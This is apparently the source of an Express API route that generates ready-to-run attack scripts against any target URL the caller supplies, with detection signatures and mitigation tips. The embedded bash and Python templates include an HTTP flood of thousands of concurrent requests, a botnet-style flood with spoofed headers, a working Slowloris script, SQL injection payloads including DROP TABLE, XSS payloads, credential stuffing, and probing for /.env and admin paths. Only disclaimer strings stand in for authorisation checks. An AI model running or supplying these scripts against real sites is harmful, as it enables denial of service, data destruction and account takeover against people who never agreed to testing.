import express from 'express'
import Joi from 'joi'

const router = express.Router()

// Validation schema for attack payload generation
const attackPayloadSchema = Joi.object({
  attackType: Joi.string().valid(
    'botnet',
    'dos',
    'mitm',
    'session_hijacking',
    'credential_reuse',
    'insider_threat',
    'custom'
  ).required(),
  targetUrl: Joi.string().uri().required(),
  customDescription: Joi.string().when('attackType', {
    is: 'custom',
    then: Joi.required(),
    otherwise: Joi.optional()
  })
})

// Helper function to extract domain from URL
function extractDomain(url: string): string {
  try {
    const urlObj = new URL(url)
    return urlObj.hostname
  } catch {
    return url
  }
}

// Attack payload generation endpoint
router.post('/generate-payload', async (req: express.Request, res: express.Response) => {
  try {
    const { error, value } = attackPayloadSchema.validate(req.body)
    if (error) {
      return res.status(400).json({
        error: 'Validation Error',
        message: error.details?.[0]?.message || 'Invalid request data'
      })
    }

    const { attackType, targetUrl, customDescription } = value
    const payload = await generateAttackPayload(attackType, targetUrl, customDescription)
    
    return res.json({
      success: true,
      attackType,
      targetUrl,
      payload,
      timestamp: new Date().toISOString(),
      disclaimer: 'This payload is for authorized security testing purposes only'
    })
  } catch (error: any) {
    console.error('Attack payload generation error:', error)
    return res.status(500).json({
      error: 'Failed to generate attack payload',
      message: error.message
    })
  }
})

// Generate attack payloads based on type
async function generateAttackPayload(attackType: string, targetUrl: string, customDescription?: string) {
  const domain = extractDomain(targetUrl)
  
  switch (attackType) {
    case 'botnet':
      return generateBotnetPayload(domain, targetUrl)
    case 'dos':
      return generateDoSPayload(domain, targetUrl)
    case 'mitm':
      return generateMITMPayload(domain, targetUrl)
    case 'session_hijacking':
      return generateSessionHijackingPayload(domain, targetUrl)
    case 'credential_reuse':
      return generateCredentialReusePayload(domain, targetUrl)
    case 'insider_threat':
      return generateInsiderThreatPayload(domain, targetUrl)
    case 'custom':
      return generateCustomAttackPayload(domain, targetUrl, customDescription!)
    default:
      throw new Error(`Unknown attack type: ${attackType}`)
  }
}

// Custom Attack Payload Generator
function generateCustomAttackPayload(domain: string, targetUrl: string, description: string) {
  // Parse the custom description to determine attack type and generate appropriate payload
  const lowerDesc = description.toLowerCase()
  
  // Determine attack category based on keywords
  let category = 'Custom'
  let riskLevel = 'high'
  
  if (lowerDesc.includes('sql') || lowerDesc.includes('injection')) {
    category = 'Web Application'
  } else if (lowerDesc.includes('xss') || lowerDesc.includes('cross-site')) {
    category = 'Web Application'
  } else if (lowerDesc.includes('buffer') || lowerDesc.includes('overflow')) {
    category = 'Memory Corruption'
  } else if (lowerDesc.includes('xml') || lowerDesc.includes('xxe')) {
    category = 'Data Processing'
  } else if (lowerDesc.includes('csrf') || lowerDesc.includes('request forgery')) {
    category = 'Web Application'
  } else if (lowerDesc.includes('ldap') || lowerDesc.includes('command')) {
    category = 'Injection'
  }

  return {
    name: `Custom ${category} Attack`,
    description: `AI-generated attack payload based on: "${description}"`,
    payload: {
      type: 'custom_attack',
      target: domain,
      custom_description: description,
      attack_vectors: [
        {
          name: 'Primary Attack Vector',
          description: `Custom attack implementation for: ${description}`,
          script: generateCustomScript(description, targetUrl, domain),
          analysis: generateAttackAnalysis(description)
        },
        {
          name: 'Reconnaissance Phase',
          description: 'Information gathering and target analysis',
          code: generateReconCode(description, targetUrl, domain)
        }
      ],
      detection_signatures: generateDetectionSignatures(description),
      mitigation_strategies: generateMitigationStrategies(description),
      risk_assessment: {
        level: riskLevel,
        category: category,
        impact: 'Varies based on target configuration and attack success',
        likelihood: 'Depends on target security posture'
      }
    }
  }
}

// Helper function to generate custom attack script
function generateCustomScript(description: string, targetUrl: string, domain: string): string {
  const lowerDesc = description.toLowerCase()
  
  if (lowerDesc.includes('sql') || lowerDesc.includes('injection')) {
    return `#!/bin/bash
# Custom SQL Injection Attack
# Target: ${domain}
# Description: ${description}
# WARNING: For authorized testing only

echo "Custom SQL Injection Test for ${domain}"
echo "Attack Type: ${description}"
echo "======================================"

# Common SQL injection payloads
payloads=(
    "' OR '1'='1"
    "' UNION SELECT NULL,NULL,NULL--"
    "'; DROP TABLE users;--"
    "' OR SLEEP(5)--"
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
)

echo "Testing SQL injection vulnerabilities..."
for payload in "\${payloads[@]}"; do
    echo "Testing payload: $payload"
    curl -X POST "${targetUrl}/login" \\
         -d "username=admin$payload&password=test" \\
         -H "Content-Type: application/x-www-form-urlencoded" \\
         --silent --output /dev/null
    sleep 1
done

echo "SQL injection testing completed"`
  } else if (lowerDesc.includes('xss') || lowerDesc.includes('cross-site')) {
    return `#!/bin/bash
# Custom XSS Attack
# Target: ${domain}
# Description: ${description}
# WARNING: For authorized testing only

echo "Custom XSS Test for ${domain}"
echo "Attack Type: ${description}"
echo "======================================"

# XSS payloads
payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg onload=alert('XSS')>"
    "javascript:alert('XSS')"
)

echo "Testing XSS vulnerabilities..."
for payload in "\${payloads[@]}"; do
    echo "Testing payload: $payload"
    curl -G "${targetUrl}/search" \\
         --data-urlencode "q=$payload" \\
         --silent --output /dev/null
    sleep 1
done

echo "XSS testing completed"`
  } else {
    return `#!/bin/bash
# Custom Attack Script
# Target: ${domain}  
# Description: ${description}
# WARNING: For authorized testing only

echo "Custom Attack Test for ${domain}"
echo "Attack Type: ${description}"
echo "======================================"

# Generic testing approach
echo "1. Target reconnaissance..."
nslookup ${domain}
curl -I ${targetUrl}

echo "2. Service enumeration..."
# Add specific tests based on attack description
echo "Implementing custom attack logic for: ${description}"

echo "Custom attack testing completed"`
  }
}

// Helper function to generate reconnaissance code
function generateReconCode(description: string, targetUrl: string, domain: string): string {
  return `#!/usr/bin/env python3
# Custom Attack Reconnaissance
# Target: ${domain}
# Description: ${description}

import requests
import socket
import dns.resolver
from urllib.parse import urlparse

class CustomAttackRecon:
    def __init__(self, target_url):
        self.target_url = target_url
        self.domain = urlparse(target_url).netloc
        
    def gather_information(self):
        """Gather target information for custom attack"""
        print(f"Reconnaissance for: {self.domain}")
        print(f"Attack type: ${description}")
        print("-" * 50)
        
        # DNS enumeration
        self.dns_enum()
        
        # HTTP reconnaissance  
        self.http_recon()
        
        # Technology detection
        self.tech_detection()
        
    def dns_enum(self):
        """DNS enumeration"""
        try:
            result = dns.resolver.resolve(self.domain, 'A')
            print(f"A Records: {[str(r) for r in result]}")
        except:
            print("DNS enumeration failed")
            
    def http_recon(self):
        """HTTP reconnaissance"""
        try:
            response = requests.get(self.target_url, timeout=10)
            print(f"Status Code: {response.status_code}")
            print(f"Server: {response.headers.get('Server', 'Unknown')}")
            print(f"Technology: {response.headers.get('X-Powered-By', 'Unknown')}")
        except:
            print("HTTP reconnaissance failed")
            
    def tech_detection(self):
        """Technology stack detection"""
        # Add technology-specific detection based on attack type
        print("Technology detection completed")

# Usage
recon = CustomAttackRecon('${targetUrl}')
recon.gather_information()`
}

// Helper function to generate detection signatures
function generateDetectionSignatures(description: string): string[] {
  const lowerDesc = description.toLowerCase()
  const baseSignatures = [
    'Unusual request patterns targeting specific endpoints',
    'Automated tool user agent strings',
    'High frequency requests from single IP',
    'Suspicious parameter values or payloads'
  ]
  
  if (lowerDesc.includes('sql')) {
    baseSignatures.push(...[
      'SQL syntax in HTTP parameters',
      'Database error messages in responses',
      'Timing-based attack patterns'
    ])
  } else if (lowerDesc.includes('xss')) {
    baseSignatures.push(...[
      'JavaScript code in input fields',
      'HTML/XML injection attempts',
      'Script tag insertion patterns'
    ])
  } else if (lowerDesc.includes('buffer')) {
    baseSignatures.push(...[
      'Oversized input parameters',
      'Binary data in text fields',
      'Memory corruption indicators'
    ])
  }
  
  return baseSignatures
}

// Helper function to generate mitigation strategies
function generateMitigationStrategies(description: string): string[] {
  const lowerDesc = description.toLowerCase()
  const baseStrategies = [
    'Implement proper input validation and sanitization',
    'Use parameterized queries and prepared statements',
    'Deploy Web Application Firewall (WAF)',
    'Regular security testing and code reviews',
    'Keep all software and dependencies updated'
  ]
  
  if (lowerDesc.includes('sql')) {
    baseStrategies.push(...[
      'Use ORM frameworks with built-in protection',
      'Implement database user privilege separation',
      'Enable database query logging and monitoring'
    ])
  } else if (lowerDesc.includes('xss')) {
    baseStrategies.push(...[
      'Implement Content Security Policy (CSP)',
      'Use output encoding/escaping for dynamic content',
      'Validate and sanitize all user inputs'
    ])
  } else if (lowerDesc.includes('buffer')) {
    baseStrategies.push(...[
      'Enable stack protection mechanisms (ASLR, DEP)',
      'Use memory-safe programming languages',
      'Implement bounds checking for all inputs'
    ])
  }
  
  return baseStrategies
}

// Helper function to generate attack analysis
function generateAttackAnalysis(description: string): string {
  return `Attack Analysis for: ${description}

This custom attack vector targets specific vulnerabilities based on the provided description. 
The attack methodology includes:

1. **Reconnaissance Phase**: Information gathering about the target
2. **Vulnerability Assessment**: Identifying potential attack vectors
3. **Exploit Development**: Creating targeted payloads
4. **Payload Delivery**: Executing the attack against the target
5. **Post-Exploitation**: Maintaining access and data extraction

Risk Level: High
Prerequisites: Network access to target, understanding of target technology stack
Success Indicators: Successful exploitation, data extraction, or system compromise

Note: This is a simulated attack for testing purposes only.`
}

// Botnet Attack Payload
function generateBotnetPayload(domain: string, targetUrl: string) {
  return {
    name: 'Botnet Simulation',
    description: 'Simulated botnet command & control payload for testing distributed attack resilience',
    payload: {
      type: 'botnet_simulation',
      target: domain,
      attack_vectors: [
        {
          name: 'HTTP Flood',
          description: 'Simulated HTTP request flood from multiple IP addresses',
          script: `#!/bin/bash
# Botnet HTTP Flood Simulation
# Target: ${domain}
# WARNING: For authorized testing only

echo "Starting Botnet Simulation for ${domain}"
echo "Simulating 1000 distributed requests..."

for i in {1..1000}; do
  # Simulate different user agents and IPs
  USER_AGENT="Mozilla/5.0 (BotNet-Node-$((RANDOM % 1000)))"
  curl -H "User-Agent: $USER_AGENT" \\
       -H "X-Forwarded-For: $((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))" \\
       --max-time 5 \\
       --silent \\
       "${targetUrl}" &
  
  # Rate limiting to prevent actual DoS
  if [ $((i % 10)) -eq 0 ]; then
    sleep 1
  fi
done

wait
echo "Botnet simulation completed"`
        },
        {
          name: 'Command & Control Communication',
          description: 'Simulated command and control communication patterns',
          code: `#!/usr/bin/env python3
# Command & Control Simulation
import requests
import random
import time

class BotnetSimulator:
    def __init__(self, target):
        self.target = target
        self.bot_count = 100
        
    def simulate_c2_communication(self):
        """Simulate C&C server communication"""
        commands = [
            'STATUS_CHECK',
            'UPDATE_TARGET', 
            'EXECUTE_ATTACK',
            'REPORT_STATUS'
        ]
        
        for bot_id in range(self.bot_count):
            command = random.choice(commands)
            print(f"Bot-{bot_id}: Receiving command {command}")
            time.sleep(0.1)  # Rate limiting
            
# Usage: BotnetSimulator('${domain}').simulate_c2_communication()`
        }
      ],
      detection_signatures: [
        'Multiple requests from different IPs with similar patterns',
        'Unusual user agent strings with botnet identifiers', 
        'High frequency requests with coordinated timing',
        'Repeated HTTP flood patterns from distributed sources'
      ],
      mitigation_strategies: [
        'Implement rate limiting per IP address',
        'Deploy DDoS protection services',
        'Monitor for suspicious user agent patterns',
        'Use CAPTCHA challenges for suspicious traffic'
      ]
    }
  }
}

// DoS Attack Payload
function generateDoSPayload(domain: string, targetUrl: string) {
  return {
    name: 'Denial of Service Test',
    description: 'Controlled DoS payload for testing server resilience and load balancing',
    payload: {
      type: 'dos_simulation',
      target: domain,
      attack_vectors: [
        {
          name: 'HTTP Flood',
          description: 'High-volume HTTP request flood',
          script: `#!/bin/bash
# DoS HTTP Flood Test
# Target: ${domain}
# WARNING: For authorized testing only

echo "Starting DoS simulation for ${domain}"
echo "Generating high-volume HTTP requests..."

# Concurrent request generator
for i in {1..50}; do
  {
    for j in {1..100}; do
      curl --max-time 1 \\
           --silent \\
           --output /dev/null \\
           "${targetUrl}" &
    done
    wait
  } &
done

wait
echo "DoS simulation completed"`
        },
        {
          name: 'Slowloris Attack',
          description: 'Connection exhaustion attack simulation',
          code: `#!/usr/bin/env python3
# Slowloris Simulation
import socket
import threading
import time
import random

class SlowlorisSimulator:
    def __init__(self, target_host, target_port=80):
        self.target_host = target_host
        self.target_port = target_port
        self.sockets = []
        
    def create_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.target_host, self.target_port))
            
            # Send incomplete HTTP request
            s.send(f"GET / HTTP/1.1\\r\\n".encode('utf-8'))
            s.send(f"Host: {self.target_host}\\r\\n".encode('utf-8'))
            s.send("User-Agent: SlowlorisTest\\r\\n".encode('utf-8'))
            
            return s
        except:
            return None
            
    def simulate_attack(self, socket_count=200):
        print(f"Starting Slowloris simulation against {self.target_host}")
        
        # Create initial sockets
        for i in range(socket_count):
            s = self.create_socket()
            if s:
                self.sockets.append(s)
                
        print(f"Created {len(self.sockets)} connections")
        
        # Keep connections alive
        while True:
            for s in self.sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\\r\\n".encode('utf-8'))
                except:
                    self.sockets.remove(s)
                    new_socket = self.create_socket()
                    if new_socket:
                        self.sockets.append(new_socket)
                        
            time.sleep(15)  # Send keep-alive every 15 seconds

# Usage: SlowlorisSimulator('${domain}').simulate_attack()`
        }
      ],
      detection_signatures: [
        'Unusual spike in concurrent connections',
        'High number of incomplete HTTP requests',
        'Resource exhaustion alerts',
        'Response time degradation patterns'
      ],
      mitigation_strategies: [
        'Configure appropriate connection timeouts',
        'Implement connection rate limiting',
        'Deploy load balancers with DoS protection',
        'Monitor server resource utilization'
      ]
    }
  }
}

// MITM Attack Payload
function generateMITMPayload(domain: string, targetUrl: string) {
  return {
    name: 'Man-in-the-Middle Attack',
    description: 'Network interception and certificate manipulation payload for testing SSL/TLS security',
    payload: {
      type: 'mitm_simulation',
      target: domain,
      attack_vectors: [
        {
          name: 'SSL Strip Attack',
          description: 'HTTPS to HTTP downgrade attack simulation',
          script: `#!/bin/bash
# SSL Strip Simulation
# Target: ${domain}
# WARNING: For authorized testing only

echo "SSL Strip Attack Simulation"
echo "Target: ${domain}"

# Check for HTTPS enforcement
echo "Testing HTTPS enforcement..."
response=$(curl -s -o /dev/null -w "%{http_code}" http://${domain})
echo "HTTP response code: $response"

if [ "$response" -eq 301 ] || [ "$response" -eq 302 ]; then
    echo "✓ HTTPS redirect detected - SSL Strip attack mitigated"
else
    echo "⚠ No HTTPS redirect - Vulnerable to SSL Strip"
fi

# Test HSTS header
echo "Checking HSTS implementation..."
hsts=$(curl -s -I https://${domain} | grep -i "strict-transport-security")
if [ -n "$hsts" ]; then
    echo "✓ HSTS header found: $hsts"
else
    echo "⚠ HSTS header missing - Vulnerable to SSL Strip"
fi`
        },
        {
          name: 'Certificate Analysis',
          description: 'Fake certificate detection simulation',
          code: `#!/usr/bin/env python3
# Certificate Analysis Tool
import ssl
import socket
import datetime

class CertificateAnalyzer:
    def __init__(self, hostname, port=443):
        self.hostname = hostname
        self.port = port
        
    def analyze_certificate(self):
        context = ssl.create_default_context()
        
        try:
            with socket.create_connection((self.hostname, self.port)) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    cert_info = ssock.getpeercert()
                    
            print(f"Certificate Analysis for {self.hostname}")
            print(f"Subject: {cert_info.get('subject', 'Unknown')}")
            print(f"Issuer: {cert_info.get('issuer', 'Unknown')}")
            print(f"Version: {cert_info.get('version', 'Unknown')}")
            
            # Check for suspicious indicators
            suspicious_indicators = []
            
            # Check certificate validity
            not_before = cert_info.get('notBefore', '')
            not_after = cert_info.get('notAfter', '')
            
            if not_before and not_after:
                print(f"Valid from: {not_before}")
                print(f"Valid until: {not_after}")
                
            return {
                'valid': True,
                'certificate_info': cert_info,
                'suspicious_indicators': suspicious_indicators
            }
            
        except Exception as e:
            return {'valid': False, 'error': str(e)}

# Usage: CertificateAnalyzer('${domain}').analyze_certificate()`
        }
      ],
      detection_signatures: [
        'Certificate warnings in browsers',
        'Unexpected certificate changes',
        'Suspicious certificate authorities',
        'Network traffic pattern anomalies'
      ],
      mitigation_strategies: [
        'Implement certificate pinning',
        'Use HSTS with preload',
        'Monitor certificate transparency logs',
        'Deploy network segmentation'
      ]
    }
  }
}

// Session Hijacking Payload
function generateSessionHijackingPayload(domain: string, targetUrl: string) {
  return {
    name: 'Session Hijacking Test',
    description: 'Session token manipulation and cookie exploitation payload',
    payload: {
      type: 'session_hijacking',
      target: domain,
      attack_vectors: [
        {
          name: 'Cookie Security Analysis',
          description: 'Analyze session cookie security configuration',
          script: `#!/bin/bash
# Session Cookie Security Analysis
# Target: ${domain}
# WARNING: For authorized testing only

echo "Session Cookie Security Analysis for ${domain}"
echo "=========================================="

# Get cookies from response
cookies=$(curl -s -I "${targetUrl}" | grep -i "set-cookie")

if [ -z "$cookies" ]; then
    echo "No cookies found in response headers"
else
    echo "Found cookies:"
    echo "$cookies"
    echo ""
    
    # Check for security flags
    echo "Security Analysis:"
    
    if echo "$cookies" | grep -qi "httponly"; then
        echo "✓ HttpOnly flag detected"
    else
        echo "⚠ HttpOnly flag missing - Vulnerable to XSS"
    fi
    
    if echo "$cookies" | grep -qi "secure"; then
        echo "✓ Secure flag detected"
    else
        echo "⚠ Secure flag missing - Vulnerable to interception"
    fi
    
    if echo "$cookies" | grep -qi "samesite"; then
        echo "✓ SameSite flag detected"
    else
        echo "⚠ SameSite flag missing - Vulnerable to CSRF"
    fi
fi`
        },
        {
          name: 'Session Token Analysis',
          description: 'Test for session token vulnerabilities',
          code: `#!/usr/bin/env python3
# Session Security Tester
import requests
import re
from urllib.parse import urlparse

class SessionTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def test_session_security(self):
        results = {
            'target': self.target_url,
            'vulnerabilities': [],
            'recommendations': []
        }
        
        try:
            # Initial request to get session
            response = self.session.get(self.target_url)
            
            # Analyze cookies
            for cookie in self.session.cookies:
                print(f"Analyzing cookie: {cookie.name}")
                
                # Check for vulnerabilities
                if not cookie.secure:
                    results['vulnerabilities'].append(
                        f"Cookie '{cookie.name}' missing Secure flag"
                    )
                    results['recommendations'].append(
                        f"Add Secure flag to cookie '{cookie.name}'"
                    )
                    
        except Exception as e:
            results['error'] = str(e)
            
        return results

# Usage: SessionTester('${targetUrl}').test_session_security()`
        }
      ],
      detection_signatures: [
        'Session tokens transmitted over HTTP',
        'Missing cookie security flags',
        'Long-lived session tokens',
        'Predictable session token patterns'
      ],
      mitigation_strategies: [
        'Use HTTPS-only session cookies',
        'Implement proper session timeout',
        'Regenerate session IDs after login',
        'Use strong session token entropy'
      ]
    }
  }
}

// Credential Reuse Attack Payload
function generateCredentialReusePayload(domain: string, targetUrl: string) {
  return {
    name: 'Credential Reuse Attack',
    description: 'Common password and credential stuffing attack simulation',
    payload: {
      type: 'credential_reuse',
      target: domain,
      attack_vectors: [
        {
          name: 'Common Password Testing',
          description: 'Test against common password lists',
          wordlists: [
            'rockyou.txt',
            'common-passwords.txt',
            'top-10000-passwords.txt'
          ],
          script: `#!/bin/bash
# Common Password Testing
# Target: ${domain}
# WARNING: For authorized testing only

echo "Common Password Testing for ${domain}"
echo "======================================"

# Common passwords to test (limited set for demo)
common_passwords=(
    "password"
    "123456"
    "password123"
    "admin"
    "qwerty"
    "letmein"
    "welcome"
    "monkey"
    "dragon"
    "master"
)

# Note: This is a demonstration script
# Real testing requires proper rate limiting and authorization
echo "Testing \${#common_passwords[@]} common passwords..."
echo "Note: This requires actual login endpoint and proper authorization"

for password in "\${common_passwords[@]}"; do
    echo "Testing password: $password"
    # Actual implementation would test against login endpoint
    # curl -X POST -d "username=admin&password=$password" "$login_endpoint"
    sleep 0.5  # Rate limiting
done

echo "Password testing simulation completed"
echo "Recommendation: Implement account lockout and strong password policies"`
        },
        {
          name: 'Credential Stuffing Simulation',
          description: 'Automated credential testing from data breaches',
          code: `#!/usr/bin/env python3
# Credential Stuffing Tester
import requests
import time
import json

class CredentialStuffer:
    def __init__(self, target_url, login_endpoint):
        self.target_url = target_url
        self.login_endpoint = login_endpoint
        self.session = requests.Session()
        self.rate_limit_delay = 1  # 1 second between attempts
        
    def load_demo_credentials(self):
        """Load demo credentials for testing"""
        return [
            ('admin@${domain}', 'password'),
            ('user@${domain}', '123456'),
            ('test@${domain}', 'password123'),
        ]
        
    def test_credential(self, email, password):
        """Test a single credential pair"""
        data = {
            'email': email,
            'password': password
        }
        
        try:
            response = self.session.post(self.login_endpoint, data=data, timeout=10)
            
            # Analyze response for successful login indicators
            success_indicators = [
                'dashboard', 'welcome', 'logout', 'profile'
            ]
            
            failure_indicators = [
                'invalid', 'error', 'failed', 'incorrect'
            ]
            
            response_text = response.text.lower()
            
            if any(indicator in response_text for indicator in success_indicators):
                return {'status': 'success', 'response_code': response.status_code}
            elif any(indicator in response_text for indicator in failure_indicators):
                return {'status': 'failed', 'response_code': response.status_code}
            else:
                return {'status': 'unknown', 'response_code': response.status_code}
                
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
            
    def run_test(self, max_attempts=50):
        """Run credential stuffing test"""
        print(f"Starting credential stuffing test against {self.target_url}")
        print(f"Login endpoint: {self.login_endpoint}")
        print(f"Rate limit: {self.rate_limit_delay} seconds between attempts")
        print("-" * 50)
        
        credentials = self.load_demo_credentials()
        results = {'successful': [], 'failed': [], 'errors': []}
        
        for i, (email, password) in enumerate(credentials, 1):
            print(f"Testing {i}/{len(credentials)}: {email}")
            
            result = self.test_credential(email, password)
            
            if result['status'] == 'success':
                results['successful'].append({'email': email, 'password': password})
                print(f"✓ SUCCESS: {email}:{password}")
            elif result['status'] == 'failed':
                results['failed'].append({'email': email})
                print(f"✗ FAILED: {email}")
            else:
                results['errors'].append({'email': email, 'error': result.get('error', 'Unknown')})
                print(f"? ERROR: {email}")
                
            # Rate limiting
            time.sleep(self.rate_limit_delay)
            
        print("-" * 50)
        print(f"Test completed: {len(results['successful'])} successful, {len(results['failed'])} failed, {len(results['errors'])} errors")
        
        return results

# Usage: 
# tester = CredentialStuffer('${targetUrl}', '${targetUrl}/login')
# results = tester.run_test()`
        }
      ],
      detection_signatures: [
        'Multiple failed login attempts from same IP',
        'Rapid-fire login attempts',
        'Login attempts with common passwords',
        'Unusual user agent strings'
      ],
      mitigation_strategies: [
        'Implement account lockout policies',
        'Use CAPTCHA after failed attempts',
        'Deploy rate limiting on login endpoints',
        'Monitor for suspicious login patterns'
      ]
    }
  }
}

// Insider Threat Payload
function generateInsiderThreatPayload(domain: string, targetUrl: string) {
  return {
    name: 'Insider Threat Simulation',
    description: 'Privileged user abuse and internal system compromise scenarios',
    payload: {
      type: 'insider_threat',
      target: domain,
      attack_vectors: [
        {
          name: 'Privilege Escalation Test',
          description: 'Test for privilege escalation vulnerabilities',
          script: `#!/bin/bash
# Privilege Escalation Test
# Target: ${domain}
# WARNING: For authorized testing only

echo "Insider Threat Simulation - Privilege Escalation"
echo "Target: ${domain}"
echo "=============================================="

echo "1. Checking for exposed admin interfaces..."
admin_paths=(
    "/admin"
    "/administrator"
    "/wp-admin"
    "/management"
    "/control"
    "/backend"
    "/dashboard"
)

for path in "\${admin_paths[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "${targetUrl}$path")
    if [ "$response" -eq 200 ]; then
        echo "⚠ Found admin interface: ${targetUrl}$path"
    elif [ "$response" -eq 302 ] || [ "$response" -eq 301 ]; then
        echo "? Potential admin interface (redirect): ${targetUrl}$path"
    fi
done

echo ""
echo "2. Testing for default credentials..."
echo "Note: This would test common admin credentials"
echo "admin/admin, admin/password, root/root, etc."

echo ""
echo "3. Checking for exposed configuration files..."
config_files=(
    "/.env"
    "/config.php"
    "/wp-config.php"
    "/settings.ini"
    "/database.yml"
)

for file in "\${config_files[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "${targetUrl}$file")
    if [ "$response" -eq 200 ]; then
        echo "⚠ Exposed config file: ${targetUrl}$file"
    fi
done`
        },
        {
          name: 'Data Access Pattern Analysis',
          description: 'Simulate internal data access and exfiltration patterns',
          code: `#!/usr/bin/env python3
# Insider Threat Data Access Simulator
import requests
import json
import time
from datetime import datetime

class InsiderThreatSimulator:
    def __init__(self, target_url, auth_token=None):
        self.target_url = target_url
        self.auth_token = auth_token
        self.session = requests.Session()
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})
            
    def simulate_data_access_patterns(self):
        """Simulate suspicious data access patterns"""
        print("Simulating insider threat data access patterns")
        print(f"Target: {self.target_url}")
        print("-" * 50)
        
        # Common data endpoints to test
        sensitive_endpoints = [
            '/api/users',
            '/api/customers',
            '/api/orders',
            '/api/financial',
            '/api/reports',
            '/api/admin/users',
            '/api/internal/data',
            '/api/backup',
            '/downloads',
            '/exports'
        ]
        
        access_patterns = {
            'bulk_downloads': [],
            'after_hours_access': [],
            'unusual_endpoints': [],
            'high_volume_requests': []
        }
        
        for endpoint in sensitive_endpoints:
            try:
                full_url = f"{self.target_url}{endpoint}"
                response = self.session.get(full_url, timeout=5)
                
                access_log = {
                    'endpoint': endpoint,
                    'timestamp': datetime.now().isoformat(),
                    'status_code': response.status_code,
                    'response_size': len(response.content)
                }
                
                print(f"Testing {endpoint}: HTTP {response.status_code}")
                
                # Analyze access patterns
                if response.status_code == 200:
                    if len(response.content) > 10000:  # Large response
                        access_patterns['bulk_downloads'].append(access_log)
                        
                elif response.status_code == 403:
                    print(f"  ⚠ Access denied - potential privilege escalation target")
                    
            except Exception as e:
                print(f"  Error accessing {endpoint}: {str(e)}")
                
            time.sleep(0.5)  # Rate limiting
            
        # Generate threat assessment
        threat_score = 0
        indicators = []
        
        if len(access_patterns['bulk_downloads']) > 2:
            threat_score += 30
            indicators.append("Multiple bulk data downloads detected")
            
        print("-" * 50)
        print(f"Insider Threat Assessment:")
        print(f"Threat Score: {threat_score}/100")
        
        if indicators:
            print("Risk Indicators:")
            for indicator in indicators:
                print(f"  • {indicator}")
        else:
            print("No high-risk patterns detected")
            
        return {
            'threat_score': threat_score,
            'indicators': indicators,
            'access_patterns': access_patterns
        }

# Usage: InsiderThreatSimulator('${targetUrl}').simulate_data_access_patterns()`
        }
      ],
      detection_signatures: [
        'Unusual data access patterns',
        'After-hours system access',
        'Large data downloads',
        'Access to unauthorized systems'
      ],
      mitigation_strategies: [
        'Implement user activity monitoring',
        'Use data loss prevention (DLP) tools',
        'Apply principle of least privilege',
        'Regular access reviews and audits'
      ]
    }
  }
}

export default router 